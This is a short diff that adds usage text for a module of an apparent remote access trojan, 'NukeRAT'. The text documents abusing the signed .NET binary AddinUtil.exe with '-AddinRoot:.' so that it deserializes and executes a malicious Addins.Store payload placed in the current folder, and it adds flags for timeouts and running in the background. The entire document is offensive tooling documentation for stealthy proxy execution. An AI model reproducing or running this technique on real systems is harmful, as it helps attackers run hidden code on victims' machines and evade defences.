@@ -1,0 +1,20 @@
+ABOUT
+    .NET utility that refreshes Microsoft Office add-in cache metadata.
+    When run from a folder containing a malicious Addins.Store payload,
+    it deserializes and executes that payload instead of normal cache work.
+
+USAGE:
+    C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.
+
+ARGUMENTS:
+    -AddinRoot:.        Use current directory as add-in root (payload location)
+
+EXAMPLES:
+    C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.
